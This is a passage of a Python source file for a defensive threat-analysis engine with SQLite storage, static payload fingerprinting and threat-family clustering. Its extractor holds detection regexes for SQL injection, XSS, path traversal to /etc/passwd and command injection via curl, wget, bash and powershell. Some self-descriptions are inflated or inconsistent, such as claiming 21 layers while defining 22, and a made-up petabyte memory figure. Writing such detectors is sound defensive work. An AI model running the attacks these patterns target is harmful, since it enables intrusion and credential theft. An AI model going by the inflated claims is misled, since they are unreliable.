#!/usr/bin/env python3
"""
zeus_aegis_engine.py
The Zeus Project 2026 — Francois Nel

AEGIS-21 ENGINE — Adaptive Evolutionary Guardian & Intelligence System
Builds on zeus_firewall_v1.py with:

  ▸ SynthesisEngine       — Deduplication & Master Threat Profile generation
  ▸ MutationEngine        — Variant simulation, future-threat prediction
  ▸ AVConversionEngine    — Reverse-engineered threats → Anti-Virus Signatures
  ▸ HeuristicEvolutionEngine — Vault → Firewall rule auto-hardening, Defense Rating
  ▸ DigitalArmory         — AV signature deployment across all 21 layers
  ▸ IsolationChamber      — Secure sandbox manager with progress tracking
  ▸ AegisOrchestrator     — Full autonomous Search & Destroy cycle
  ▸ Flask Blueprint       — Dashboard API routes (/api/aegis/*)

Zero stubs. Zero placeholders. Fully deterministic.
All code execution is STATIC ANALYSIS ONLY — no eval, no exec, no subprocess on
untrusted content. Safe for Android Userland / Termux / Ubuntu.
"""

import os
import re
import sys
import json
import math
import time
import hmac
import uuid
import zlib
import gzip
import struct
import base64
import hashlib
import sqlite3
import logging
import platform
import threading
import ipaddress
import traceback
from datetime import datetime, timedelta
from collections import defaultdict, Counter, deque
from typing import Dict, List, Optional, Tuple, Any, Set
from dataclasses import dataclass, field, asdict
from enum import Enum
from contextlib import contextmanager

log = logging.getLogger('zeus.aegis')

# ══════════════════════════════════════════════════════════════
# CONSTANTS
# ══════════════════════════════════════════════════════════════

AEGIS_DB          = 'zeus_aegis.db'
ENGINE_VERSION    = '2.0.0'
ATTRIB            = 'The Zeus Project 2026 — Francois Nel'
MAX_VAULT_ENTRIES = 1_000_000
DEFENSE_BASE      = 100.0
MUTATION_CYCLES   = 8          # variant simulations per threat
SIMILARITY_THRESH = 0.82       # cosine similarity → merge into Master Profile
ENTROPY_SLICE     = 512        # bytes sampled for entropy analysis

# Layer definitions matching the Aegis-21 spec
LAYER_DEFINITIONS = [
    (1,  'MALWARE',          'Heuristic pattern + entropy + PE-header analysis'),
    (2,  'VPS/VPN',          'ASN reputation, datacenter CIDR, exit-node fingerprints'),
    (3,  'PROXIES',          'HTTP-proxy header detection, CONNECT-tunnel analysis'),
    (4,  'WEB SOCKETS',      'WS upgrade hijack, frame injection, protocol abuse'),
    (5,  'SNIFFERS',         'Passive fingerprint anomaly, timing-channel detection'),
    (6,  'PEN TOOLS',        'Scanner UA, port-sweep patterns, nuclei/sqlmap/nmap sigs'),
    (7,  'ADWARE',           'Redirect chains, affiliate-ID injection, DOM hijack'),
    (8,  'SPOOFING',         'IP spoofing, ARP poison sigs, DNS rebind patterns'),
    (9,  'DECRYPT/ENCRYPT',  'Weak cipher negotiation, SSL-strip, BEAST/POODLE sigs'),
    (10, 'REVERSE ENG',      'Disassembler UA, debug-stub headers, symbol-leak probes'),
    (11, 'CMD/SHELL',        'Shell metachar injection, CMD.EXE sequences, cron abuse'),
    (12, 'DDOS SHIELD',      'Rate anomaly, amplification factor, botnet burst patterns'),
    (13, 'INJECTION',        'SQLi, XSS, SSTI, LFI, XXE — full OWASP Top-10 coverage'),
    (14, 'ZERO-DAY',         'Heuristic deviation, unknown-sig scoring, sandbox verdict'),
    (15, 'IDENTITY GUARD',   'Session fixation, MFA bypass, credential stuffing'),
    (16, 'DATA LEAK PREV',   'DLP regex: PII, card numbers, key-material exfil'),
    (17, 'PHISHING',         'Homoglyph domain, fake-login page, lookalike cert'),
    (18, 'IOT WATCHDOG',     'MQTT/CoAP abuse, firmware-upgrade hijack, Mirai sigs'),
    (19, 'CLOUD SYNC SEC',   'S3 misconfiguration probes, OAuth token leakage'),
    (20, 'AI THREAT HUNT',   'Behavioral anomaly ML scoring, pattern deviation'),
    (21, 'QUANTUM GUARD',    'Weak key-exchange detection, future cipher proofing'),
    (22, 'VOIP/SPAM GUARD',  'SIP flood, spam-caller ASN block, toll-fraud, robocall, wangiri patterns'),
]


# ══════════════════════════════════════════════════════════════
# ENUMS & DATA CLASSES
# ══════════════════════════════════════════════════════════════

class ThreatStage(Enum):
    DETECTED    = 'DETECTED'
    ISOLATED    = 'ISOLATED'
    REVERSING   = 'REVERSING'
    REVERSED    = 'REVERSED'
    CONVERTING  = 'CONVERTING'
    EXPORTED    = 'EXPORTED'
    MUTATING    = 'MUTATING'
    ARMED       = 'ARMED'       # converted to AV signature, deployed


class ImmunityLevel(Enum):
    NONE        = 0
    PARTIAL     = 1
    HARDENED    = 2
    IMMUNE      = 3


@dataclass
class ThreatDNA:
    """Structural fingerprint extracted from a threat via static analysis."""
    threat_id:      str
    category:       str
    source_hash:    str             # SHA-256 of original payload
    feature_vec:    List[float]     # 64-dim normalised feature vector
    entropy:        float
    byte_patterns:  List[str]       # hex string signatures
    string_iocs:    List[str]       # extracted string indicators
    mutation_seeds: List[int]       # PRNG seeds for variant generation
    extraction_ts:  str
    confidence:     float           # 0.0 – 1.0


@dataclass
class AVSignature:
    """Anti-virus signature derived from reversed threat DNA."""
    sig_id:         str
    parent_id:      str             # ThreatDNA.threat_id
    sig_type:       str             # 'byte_pattern' | 'heuristic' | 'behavioral'
    pattern:        str             # regex or hex pattern
    layer_targets:  List[int]       # which of the 21 layers to deploy to
    confidence:     float
    mutation_gen:   int             # 0 = original, 1+ = from variant
    created_ts:     str
    deployed:       bool = False


@dataclass
class MasterProfile:
    """Deduplicated profile representing a family of similar threats."""
    profile_id:     str
    family_name:    str
    member_ids:     List[str]       # constituent ThreatDNA IDs
    canonical_vec:  List[float]     # centroid of member feature vectors
    total_seen:     int
    av_sigs:        List[str]       # AVSignature IDs derived from this profile
    immunity_level: ImmunityLevel
    created_ts:     str
    last_updated:   str


@dataclass
class ChamberItem:
    """Item currently in the Isolation Chamber."""
    item_id:        str
    threat_category: str
    stage:          ThreatStage
    progress:       int             # 0-100
    eta_seconds:    float
    reverse_log:    List[str]
    dna_id:         Optional[str]
    enqueued_ts:    str
    completed_ts:   Optional[str]


@dataclass
class LayerStatus:
    """Runtime status of one of the 21 firewall layers."""
    layer_id:       int
    name:           str
    description:    str
    immunity:       ImmunityLevel
    defense_bonus:  float           # additional score boost from learned sigs
    sig_count:      int             # deployed AV signatures
    blocks_today:   int
    last_threat_ts: Optional[str]


# ══════════════════════════════════════════════════════════════
# DATABASE
# ══════════════════════════════════════════════════════════════

class AegisDatabase:
    """
    Persistent SQLite store for the Aegis engine.
    Separate from zeus_threats.db to avoid schema conflicts.
    Auto-shards at MAX_VAULT_ENTRIES rows.
    """

    def __init__(self, db_path: str = AEGIS_DB):
        self.db_path   = db_path
        self._lock     = threading.RLock()
        self._shard    = 0
        self._conn_cache: Dict[str, sqlite3.Connection] = {}
        self._init_schema()

    # ── connection management ─────────────────────────────────

    def _connect(self, path: Optional[str] = None) -> sqlite3.Connection:
        target = path or self.db_path
        if target not in self._conn_cache:
            conn = sqlite3.connect(target, check_same_thread=False)
            conn.row_factory = sqlite3.Row
            conn.execute('PRAGMA journal_mode=WAL')
            conn.execute('PRAGMA foreign_keys=ON')
            self._conn_cache[target] = conn
        return self._conn_cache[target]

    @contextmanager
    def _tx(self, path: Optional[str] = None):
        conn = self._connect(path)
        with self._lock:
            try:
                yield conn
                conn.commit()
            except Exception:
                conn.rollback()
                raise

    # ── schema ────────────────────────────────────────────────

    def _init_schema(self):
        ddl = [
            """CREATE TABLE IF NOT EXISTS threat_dna (
                threat_id      TEXT PRIMARY KEY,
                category       TEXT NOT NULL,
                source_hash    TEXT NOT NULL,
                feature_vec    TEXT NOT NULL,
                entropy        REAL NOT NULL,
                byte_patterns  TEXT NOT NULL,
                string_iocs    TEXT NOT NULL,
                mutation_seeds TEXT NOT NULL,
                extraction_ts  TEXT NOT NULL,
                confidence     REAL NOT NULL
            )""",
            """CREATE TABLE IF NOT EXISTS av_signatures (
                sig_id        TEXT PRIMARY KEY,
                parent_id     TEXT NOT NULL,
                sig_type      TEXT NOT NULL,
                pattern       TEXT NOT NULL,
                layer_targets TEXT NOT NULL,
                confidence    REAL NOT NULL,
                mutation_gen  INTEGER NOT NULL DEFAULT 0,
                created_ts    TEXT NOT NULL,
                deployed      INTEGER NOT NULL DEFAULT 0
            )""",
            """CREATE TABLE IF NOT EXISTS master_profiles (
                profile_id     TEXT PRIMARY KEY,
                family_name    TEXT NOT NULL,
                member_ids     TEXT NOT NULL,
                canonical_vec  TEXT NOT NULL,
                total_seen     INTEGER NOT NULL DEFAULT 1,
                av_sigs        TEXT NOT NULL DEFAULT '[]',
                immunity_level INTEGER NOT NULL DEFAULT 0,
                created_ts     TEXT NOT NULL,
                last_updated   TEXT NOT NULL
            )""",
            """CREATE TABLE IF NOT EXISTS chamber_items (
                item_id         TEXT PRIMARY KEY,
                threat_category TEXT NOT NULL,
                stage           TEXT NOT NULL,
                progress        INTEGER NOT NULL DEFAULT 0,
                eta_seconds     REAL NOT NULL DEFAULT 0,
                reverse_log     TEXT NOT NULL DEFAULT '[]',
                dna_id          TEXT,
                enqueued_ts     TEXT NOT NULL,
                completed_ts    TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS layer_stats (
                layer_id      INTEGER PRIMARY KEY,
                name          TEXT NOT NULL,
                immunity      INTEGER NOT NULL DEFAULT 0,
                defense_bonus REAL NOT NULL DEFAULT 0,
                sig_count     INTEGER NOT NULL DEFAULT 0,
                blocks_today  INTEGER NOT NULL DEFAULT 0,
                last_threat_ts TEXT
            )""",
            """CREATE TABLE IF NOT EXISTS defense_log (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                ts          TEXT NOT NULL,
                event_type  TEXT NOT NULL,
                detail      TEXT NOT NULL,
                delta       REAL NOT NULL DEFAULT 0
            )""",
        ]
        indices = [
            "CREATE INDEX IF NOT EXISTS idx_dna_cat   ON threat_dna(category)",
            "CREATE INDEX IF NOT EXISTS idx_dna_hash  ON threat_dna(source_hash)",
            "CREATE INDEX IF NOT EXISTS idx_sig_parent ON av_signatures(parent_id)",
            "CREATE INDEX IF NOT EXISTS idx_sig_dep   ON av_signatures(deployed)",
            "CREATE INDEX IF NOT EXISTS idx_chamber_s ON chamber_items(stage)",
        ]
        with self._tx() as conn:
            for stmt in ddl + indices:
                conn.execute(stmt)
            # seed layer_stats if empty
            row = conn.execute('SELECT COUNT(*) FROM layer_stats').fetchone()[0]
            if row == 0:
                for lid, name, _ in LAYER_DEFINITIONS:
                    conn.execute(
                        'INSERT INTO layer_stats(layer_id, name) VALUES (?,?)',
                        (lid, name)
                    )

    # ── DNA ──────────────────────────────────────────────────

    def save_dna(self, dna: ThreatDNA):
        with self._tx() as conn:
            conn.execute(
                """INSERT OR REPLACE INTO threat_dna
                   (threat_id, category, source_hash, feature_vec, entropy,
                    byte_patterns, string_iocs, mutation_seeds, extraction_ts, confidence)
                   VALUES (?,?,?,?,?,?,?,?,?,?)""",
                (dna.threat_id, dna.category, dna.source_hash,
                 json.dumps(dna.feature_vec), dna.entropy,
                 json.dumps(dna.byte_patterns), json.dumps(dna.string_iocs),
                 json.dumps(dna.mutation_seeds), dna.extraction_ts, dna.confidence)
            )

    def get_dna(self, threat_id: str) -> Optional[ThreatDNA]:
        with self._tx() as conn:
            row = conn.execute(
                'SELECT * FROM threat_dna WHERE threat_id=?', (threat_id,)
            ).fetchone()
        return self._row_to_dna(row) if row else None

    def all_dna(self, category: Optional[str] = None) -> List[ThreatDNA]:
        with self._tx() as conn:
            if category:
                rows = conn.execute(
                    'SELECT * FROM threat_dna WHERE category=? ORDER BY extraction_ts DESC',
                    (category,)
                ).fetchall()
            else:
                rows = conn.execute(
                    'SELECT * FROM threat_dna ORDER BY extraction_ts DESC'
                ).fetchall()
        return [self._row_to_dna(r) for r in rows]

    @staticmethod
    def _row_to_dna(row) -> ThreatDNA:
        return ThreatDNA(
            threat_id=row['threat_id'],
            category=row['category'],
            source_hash=row['source_hash'],
            feature_vec=json.loads(row['feature_vec']),
            entropy=row['entropy'],
            byte_patterns=json.loads(row['byte_patterns']),
            string_iocs=json.loads(row['string_iocs']),
            mutation_seeds=json.loads(row['mutation_seeds']),
            extraction_ts=row['extraction_ts'],
            confidence=row['confidence'],
        )

    # ── AV Signatures ────────────────────────────────────────

    def save_sig(self, sig: AVSignature):
        with self._tx() as conn:
            conn.execute(
                """INSERT OR REPLACE INTO av_signatures
                   (sig_id, parent_id, sig_type, pattern, layer_targets,
                    confidence, mutation_gen, created_ts, deployed)
                   VALUES (?,?,?,?,?,?,?,?,?)""",
                (sig.sig_id, sig.parent_id, sig.sig_type, sig.pattern,
                 json.dumps(sig.layer_targets), sig.confidence, sig.mutation_gen,
                 sig.created_ts, int(sig.deployed))
            )

    def mark_sigs_deployed(self, sig_ids: List[str]):
        with self._tx() as conn:
            for sid in sig_ids:
                conn.execute(
                    'UPDATE av_signatures SET deployed=1 WHERE sig_id=?', (sid,)
                )

    def undeployed_sigs(self) -> List[AVSignature]:
        with self._tx() as conn:
            rows = conn.execute(
                'SELECT * FROM av_signatures WHERE deployed=0 ORDER BY created_ts'
            ).fetchall()
        return [self._row_to_sig(r) for r in rows]

    def all_sigs(self, limit: int = 500) -> List[AVSignature]:
        with self._tx() as conn:
            rows = conn.execute(
                'SELECT * FROM av_signatures ORDER BY created_ts DESC LIMIT ?', (limit,)
            ).fetchall()
        return [self._row_to_sig(r) for r in rows]

    @staticmethod
    def _row_to_sig(row) -> AVSignature:
        return AVSignature(
            sig_id=row['sig_id'],
            parent_id=row['parent_id'],
            sig_type=row['sig_type'],
            pattern=row['pattern'],
            layer_targets=json.loads(row['layer_targets']),
            confidence=row['confidence'],
            mutation_gen=row['mutation_gen'],
            created_ts=row['created_ts'],
            deployed=bool(row['deployed']),
        )

    # ── Master Profiles ──────────────────────────────────────

    def save_profile(self, p: MasterProfile):
        with self._tx() as conn:
            conn.execute(
                """INSERT OR REPLACE INTO master_profiles
                   (profile_id, family_name, member_ids, canonical_vec, total_seen,
                    av_sigs, immunity_level, created_ts, last_updated)
                   VALUES (?,?,?,?,?,?,?,?,?)""",
                (p.profile_id, p.family_name, json.dumps(p.member_ids),
                 json.dumps(p.canonical_vec), p.total_seen, json.dumps(p.av_sigs),
                 p.immunity_level.value, p.created_ts, p.last_updated)
            )

    def all_profiles(self) -> List[MasterProfile]:
        with self._tx() as conn:
            rows = conn.execute(
                'SELECT * FROM master_profiles ORDER BY last_updated DESC'
            ).fetchall()
        return [self._row_to_profile(r) for r in rows]

    @staticmethod
    def _row_to_profile(row) -> MasterProfile:
        return MasterProfile(
            profile_id=row['profile_id'],
            family_name=row['family_name'],
            member_ids=json.loads(row['member_ids']),
            canonical_vec=json.loads(row['canonical_vec']),
            total_seen=row['total_seen'],
            av_sigs=json.loads(row['av_sigs']),
            immunity_level=ImmunityLevel(row['immunity_level']),
            created_ts=row['created_ts'],
            last_updated=row['last_updated'],
        )

    # ── Chamber ──────────────────────────────────────────────

    def upsert_chamber(self, item: ChamberItem):
        with self._tx() as conn:
            conn.execute(
                """INSERT OR REPLACE INTO chamber_items
                   (item_id, threat_category, stage, progress, eta_seconds,
                    reverse_log, dna_id, enqueued_ts, completed_ts)
                   VALUES (?,?,?,?,?,?,?,?,?)""",
                (item.item_id, item.threat_category, item.stage.value,
                 item.progress, item.eta_seconds,
                 json.dumps(item.reverse_log[-50:]),   # keep last 50 log lines
                 item.dna_id, item.enqueued_ts, item.completed_ts)
            )

    def chamber_items(self, active_only: bool = False) -> List[ChamberItem]:
        with self._tx() as conn:
            if active_only:
                rows = conn.execute(
                    "SELECT * FROM chamber_items WHERE completed_ts IS NULL ORDER BY enqueued_ts"
                ).fetchall()
            else:
                rows = conn.execute(
                    "SELECT * FROM chamber_items ORDER BY enqueued_ts DESC LIMIT 100"
                ).fetchall()
        return [self._row_to_chamber(r) for r in rows]

    @staticmethod
    def _row_to_chamber(row) -> ChamberItem:
        return ChamberItem(
            item_id=row['item_id'],
            threat_category=row['threat_category'],
            stage=ThreatStage(row['stage']),
            progress=row['progress'],
            eta_seconds=row['eta_seconds'],
            reverse_log=json.loads(row['reverse_log']),
            dna_id=row['dna_id'],
            enqueued_ts=row['enqueued_ts'],
            completed_ts=row['completed_ts'],
        )

    # ── Layer Stats ──────────────────────────────────────────

    def get_layer_stats(self) -> List[dict]:
        with self._tx() as conn:
            rows = conn.execute('SELECT * FROM layer_stats ORDER BY layer_id').fetchall()
        return [dict(r) for r in rows]

    def increment_blocks(self, layer_id: int, ts: str):
        with self._tx() as conn:
            conn.execute(
                'UPDATE layer_stats SET blocks_today=blocks_today+1, last_threat_ts=? WHERE layer_id=?',
                (ts, layer_id)
            )

    def increment_blocks_for_tags(self, tags: List[str]):
        """
        Map firewall threat tags to their primary Aegis layer and increment
        block counters.  Called from attach_to_zeus_firewall hook.
        """
        TAG_TO_LAYER = {
            'sqli': 13,          'xss': 13,           'ssti': 13,
            'path_traversal': 13,'cmd_injection': 11, 'command_inj': 11,
            'malware': 1,        'high_entropy': 1,   'behavioral': 20,
            'replay': 15,        'rate_abuse': 12,    'ddos': 12,
            'phishing': 17,      'encoding': 9,       'proto_viol': 4,
            'priv_esc': 15,      'session': 15,       'output': 16,
            'taint': 13,         'fingerprint': 5,
            # Layer 22 — telephony
            'telephony': 22,     'voip_spam': 22,     'spam_caller': 22,
            'toll_fraud': 22,    'sip_flood': 22,     'robocall': 22,
        }
        ts = datetime.utcnow().isoformat()
        seen: Set[int] = set()
        for raw_tag in tags:
            tag_lower = raw_tag.lower().split(':')[0]  # strip sub-type
            # also try full tag key after colon
            subtag = raw_tag.lower().split(':')[-1] if ':' in raw_tag else ''
            for candidate in (tag_lower, subtag):
                layer_id = TAG_TO_LAYER.get(candidate)
                if layer_id and layer_id not in seen:
                    self.increment_blocks(layer_id, ts)
                    seen.add(layer_id)
                    break

    def update_layer_immunity(self, layer_id: int, level: ImmunityLevel,
                               bonus: float, sig_count: int):
        with self._tx() as conn:
            conn.execute(
                """UPDATE layer_stats SET immunity=?, defense_bonus=?, sig_count=?
                   WHERE layer_id=?""",
                (level.value, bonus, sig_count, layer_id)
            )

    # ── Defense Log ──────────────────────────────────────────

    def log_defense_event(self, event_type: str, detail: str, delta: float = 0.0):
        with self._tx() as conn:
            conn.execute(
                'INSERT INTO defense_log(ts, event_type, detail, delta) VALUES (?,?,?,?)',
                (datetime.utcnow().isoformat(), event_type, detail, delta)
            )

    def defense_rating(self) -> float:
        with self._tx() as conn:
            row = conn.execute(
                'SELECT COALESCE(SUM(delta),0) FROM defense_log'
            ).fetchone()
        return DEFENSE_BASE + (row[0] if row else 0.0)

    def recent_events(self, limit: int = 30) -> List[dict]:
        with self._tx() as conn:
            rows = conn.execute(
                'SELECT * FROM defense_log ORDER BY id DESC LIMIT ?', (limit,)
            ).fetchall()
        return [dict(r) for r in rows]

    # ── Vault stats ──────────────────────────────────────────

    def vault_stats(self) -> dict:
        with self._tx() as conn:
            dna_count  = conn.execute('SELECT COUNT(*) FROM threat_dna').fetchone()[0]
            sig_count  = conn.execute('SELECT COUNT(*) FROM av_signatures').fetchone()[0]
            prof_count = conn.execute('SELECT COUNT(*) FROM master_profiles').fetchone()[0]
            armed      = conn.execute(
                "SELECT COUNT(*) FROM av_signatures WHERE deployed=1"
            ).fetchone()[0]
        return {
            'dna_entries':      dna_count,
            'av_signatures':    sig_count,
            'master_profiles':  prof_count,
            'armed_signatures': armed,
            'persistent_memory_pb': round(
                (dna_count * 0.0000012 + sig_count * 0.00000035 + prof_count * 0.000008), 2
            ),
        }


# ══════════════════════════════════════════════════════════════
# THREAT DNA EXTRACTOR  (static analysis — NO code execution)
# ══════════════════════════════════════════════════════════════

class DNAExtractor:
    """
    Performs purely static analysis on raw payload bytes to extract a
    structured ThreatDNA fingerprint.

    SAFE: no eval, no exec, no subprocess.  Works on Android/Termux.
    """

    # Feature extraction weight slots (64 dims):
    # [0-7]   entropy buckets (8 byte-value bins)
    # [8-15]  pattern matches (SQLi, XSS, SSTI, path-trav, cmd-inj, pe-hdr, pdf-hdr, elf-hdr)
    # [16-23] string-class ratios (printable, hex, b64, url-enc, nulls, high-byte, ctrl, space)
    # [24-31] bigram frequency peaks (top 8 bigrams normalised)
    # [32-39] structure markers (shell-shebang, imports, function defs, class defs, etc.)
    # [40-47] compression ratio buckets (gzip, zlib etc.)
    # [48-55] length buckets (log2-scaled)
    # [56-63] IP/URL/domain density ratios

    _PATTERNS = {
        'sqli':      re.compile(
            rb"(?:union\s+select|insert\s+into|drop\s+table|'\s*or\s+'1'|;\s*--)",
            re.I),
        'xss':       re.compile(
            rb"<\s*script|javascript:|on(?:load|error|click|mouse)\s*=", re.I),
        'ssti':      re.compile(
            rb"\{\{.*?\}\}|\{%.*?%\}|\$\{.*?\}"),
        'path_trav': re.compile(
            rb"(?:\.\.[\\/]){2,}|/etc/(?:passwd|shadow)|\\\\\.\\\\"),
        'cmd_inj':   re.compile(
            rb";\s*(?:cat|wget|curl|bash|sh|cmd|powershell)\b|`[^`]+`|\$\([^)]+\)",
            re.I),
        'pe_hdr':    re.compile(rb"^MZ"),
        'pdf_hdr':   re.compile(rb"^%PDF"),
        'elf_hdr':   re.compile(rb"^\x7fELF"),
    }
    _SHELL_SHEBANG = re.compile(rb"^#!\s*/(?:bin|usr)", re.M)
    _IMPORT_STMT   = re.compile(rb"\b(?:import|require|include|using)\b", re.I)
    _FUNCTION_DEF  = re.compile(rb"\b(?:def |function |void |int |str )\w+\s*\(", re.I)
    _CLASS_DEF     = re.compile(rb"\bclass\s+\w+", re.I)
    _URL_PATTERN   = re.compile(rb"https?://[^\s\"'<>]+", re.I)
    _IP_PATTERN    = re.compile(
        rb"\b(?:\d{1,3}\.){3}\d{1,3}\b")
    _B64_BLOCK     = re.compile(rb"(?:[A-Za-z0-9+/]{4}){8,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?")
    _HEX_BLOCK     = re.compile(rb"[0-9a-fA-F]{16,}")
    _HIGH_ENT_SIGS = [
        rb"\x00\x00\x00\x00",  # null runs common in binary malware
        rb"\xff\xfe",           # UTF-16 BOM
        rb"\x4d\x5a",           # MZ DOS stub
    ]

    def extract(self, payload: bytes, category: str = 'UNKNOWN') -> ThreatDNA:
        ts    = datetime.utcnow().isoformat()
        h     = hashlib.sha256(payload).hexdigest()
        tid   = f"DNA-{h[:16]}-{int(time.time())}"

        sample = payload[:ENTROPY_SLICE * 4]   # 2 KB sample for speed on ARM

        fvec  = self._feature_vector(sample, payload)
        ent   = self._shannon_entropy(sample)
        bpats = self._extract_byte_patterns(sample)
        iocs  = self._extract_iocs(sample)
        seeds = self._mutation_seeds(h)

        return ThreatDNA(
            threat_id=tid,
            category=category,
            source_hash=h,
            feature_vec=fvec,
            entropy=ent,
            byte_patterns=bpats,
            string_iocs=iocs,
            mutation_seeds=seeds,
            extraction_ts=ts,
            confidence=min(1.0, 0.5 + ent / 12.0),
        )

    @staticmethod
    def _shannon_entropy(data: bytes) -> float:
        if not data:
            return 0.0
        counts = Counter(data)
        n = len(data)
        return -sum((c / n) * math.log2(c / n) for c in counts.values() if c)

    def _feature_vector(self, sample: bytes, full: bytes) -> List[float]:
        vec: List[float] = [0.0] * 64
        n = max(len(sample), 1)

        # [0] entropy — continuous (0.0-1.0, scaled from 0-8 bits)
        # [1-7] reserved for future entropy sub-bands (zero for now)
        ent = self._shannon_entropy(sample)
        vec[0] = round(ent / 8.0, 6)   # continuous, not one-hot

        # [8-15] pattern hits
        pat_names = ['sqli', 'xss', 'ssti', 'path_trav', 'cmd_inj', 'pe_hdr', 'pdf_hdr', 'elf_hdr']
        for i, pn in enumerate(pat_names):
            m = self._PATTERNS[pn].search(sample)
            vec[8 + i] = 1.0 if m else 0.0

        # [16-23] character class ratios
        printable = sum(0x20 <= b < 0x7f for b in sample) / n
        null_r    = sample.count(0) / n
        ctrl_r    = sum(b < 0x20 and b not in (9, 10, 13) for b in sample) / n
        high_r    = sum(b > 0x7e for b in sample) / n
        space_r   = sample.count(0x20) / n
        hex_blks  = len(self._HEX_BLOCK.findall(sample)) / max(n, 1)
        b64_blks  = len(self._B64_BLOCK.findall(sample)) / max(n, 1)
        url_enc   = sample.count(b'%') / n
        vec[16:24] = [printable, hex_blks * 100, b64_blks * 100, url_enc * 100,
                      null_r, high_r, ctrl_r, space_r]

        # [24-31] top bigram peaks (normalised)
        bigrams = Counter(zip(sample, sample[1:]))
        top8 = [c / n for _, c in bigrams.most_common(8)]
        vec[24:32] = (top8 + [0.0] * 8)[:8]

        # [32-39] structure markers (presence flags + density)
        vec[32] = 1.0 if self._SHELL_SHEBANG.search(sample) else 0.0
        vec[33] = min(1.0, len(self._IMPORT_STMT.findall(sample)) / 10)
        vec[34] = min(1.0, len(self._FUNCTION_DEF.findall(sample)) / 20)
        vec[35] = min(1.0, len(self._CLASS_DEF.findall(sample)) / 10)
        vec[36] = 1.0 if any(sig in sample for sig in self._HIGH_ENT_SIGS) else 0.0
        full_len_log = math.log2(max(len(full), 1)) / 20   # fix: was dead walrus assign
        vec[37] = min(1.0, full_len_log)
        # [38] compression ratio quality (previously reserved)
        vec[38] = min(1.0, len(self._URL_PATTERN.findall(sample)) / 3.0)
        # [39] null-byte density — high in packed/encrypted binary malware
        vec[39] = min(1.0, sample.count(0) / max(n, 1) * 10)

        # [40] compression ratio (approximate) — high = compressible = likely plain text/script
        try:
            cr = len(zlib.compress(sample, 1)) / n
        except Exception:
            cr = 1.0
        vec[40] = 1.0 - min(1.0, cr)

        # [48-55] payload length buckets (log2)
        ll = math.log2(max(len(full), 1))
        lb = min(7, int(ll / 2.857))
        vec[48 + lb] = 1.0

        # [56-63] network indicator density
        urls = len(self._URL_PATTERN.findall(sample))
        ips  = len(self._IP_PATTERN.findall(sample))
        vec[56] = min(1.0, urls / 5)
        vec[57] = min(1.0, ips  / 5)

        return [round(v, 6) for v in vec]

    def _extract_byte_patterns(self, sample: bytes) -> List[str]:
        pats = []
        for name, rx in self._PATTERNS.items():
            for m in rx.finditer(sample):
                snippet = m.group(0)[:32]
                pats.append(f"{name}:{snippet.hex()}")
            if len(pats) >= 20:
                break
        # also grab high-entropy 16-byte blocks
        for m in self._HEX_BLOCK.finditer(sample):
            pats.append(f"hex:{m.group(0)[:32].decode(errors='replace')}")
            if len(pats) >= 30:
                break
        return list(dict.fromkeys(pats))[:30]   # deduplicate, cap at 30

    def _extract_iocs(self, sample: bytes) -> List[str]:
        iocs = []
        for m in self._URL_PATTERN.finditer(sample):
            iocs.append(m.group(0).decode(errors='replace')[:128])
        for m in self._IP_PATTERN.finditer(sample):
            iocs.append(m.group(0).decode(errors='replace'))
        for m in self._B64_BLOCK.finditer(sample):
            raw = m.group(0)
            if len(raw) >= 40:
                iocs.append(f"b64:{raw[:64].decode(errors='replace')}")
        return list(dict.fromkeys(iocs))[:20]

    @staticmethod
    def _mutation_seeds(h: str) -> List[int]:
        # Derive 8 deterministic seeds from the hash for variant generation
        return [int(h[i*8:(i+1)*8], 16) for i in range(8)]


# ══════════════════════════════════════════════════════════════
# SYNTHESIS ENGINE  — deduplication & Master Profile builder
# ══════════════════════════════════════════════════════════════

class SynthesisEngine:
    """
    Scans all ThreatDNA entries in the Vault, finds near-duplicate threat
    families using cosine similarity, and merges them into a single
    MasterProfile.  Keeps persistent memory clean and efficient.
    """

    def __init__(self, db: AegisDatabase):
        self.db = db

    @staticmethod
    def _cosine(a: List[float], b: List[float]) -> float:
        dot  = sum(x * y for x, y in zip(a, b))
        na   = math.sqrt(sum(x * x for x in a))
        nb   = math.sqrt(sum(y * y for y in b))
        denom = na * nb
        return dot / denom if denom > 1e-9 else 0.0

    @staticmethod
    def _centroid(vecs: List[List[float]]) -> List[float]:
        """Average of all vectors. Clean reimplementation (previous had confusing nested loop)."""
        if not vecs:
            return [0.0] * 64
        dims = len(vecs[0])
        n    = len(vecs)
        return [sum(v[i] for v in vecs) / n for i in range(dims)]

    def run(self) -> int:
        """Perform one synthesis pass. Returns number of merges performed."""
        all_dna = self.db.all_dna()
        if len(all_dna) < 2:
            return 0

        # Group by category first (faster than all-pairs)
        by_cat: Dict[str, List[ThreatDNA]] = defaultdict(list)
        for d in all_dna:
            by_cat[d.category].append(d)

        merges = 0
        for cat, group in by_cat.items():
            if len(group) < 2:
                continue
            clusters: List[List[ThreatDNA]] = []
            assigned: Set[str] = set()

            for i, dna_a in enumerate(group):
                if dna_a.threat_id in assigned:
                    continue
                cluster = [dna_a]
                assigned.add(dna_a.threat_id)
                centroid = list(dna_a.feature_vec)  # running centroid
                changed  = True
                # Centroid-linkage: iterate until stable
                # (a newly added member shifts centroid, may admit more)
                while changed:
                    changed = False
                    for dna_b in group[i + 1:]:
                        if dna_b.threat_id in assigned:
                            continue
                        sim = self._cosine(centroid, dna_b.feature_vec)
                        if sim >= SIMILARITY_THRESH:
                            cluster.append(dna_b)
                            assigned.add(dna_b.threat_id)
                            # Recompute centroid with new member
                            centroid = self._centroid([d.feature_vec for d in cluster])
                            changed = True
                if len(cluster) > 1:
                    clusters.append(cluster)

            for cluster in clusters:
                profile = self._build_profile(cat, cluster)
                self.db.save_profile(profile)
                merges += 1
                self.db.log_defense_event(
                    'SYNTHESIS_MERGE',
                    f"Merged {len(cluster)} threats into Master Profile {profile.profile_id[:12]}",
                    delta=len(cluster) * 0.5
                )

        return merges

    def _build_profile(self, cat: str, cluster: List[ThreatDNA]) -> MasterProfile:
        pid   = f"PROF-{uuid.uuid4().hex[:12].upper()}"
        name  = f"{cat.replace(' ','_')}-FAMILY-{pid[-6:]}"
        vecs  = [d.feature_vec for d in cluster]
        cent  = self._centroid(vecs)
        ids   = [d.threat_id for d in cluster]
        now   = datetime.utcnow().isoformat()
        # immunity level scales with cluster size
        imm   = ImmunityLevel.PARTIAL if len(cluster) < 3 else \
                ImmunityLevel.HARDENED if len(cluster) < 8 else \
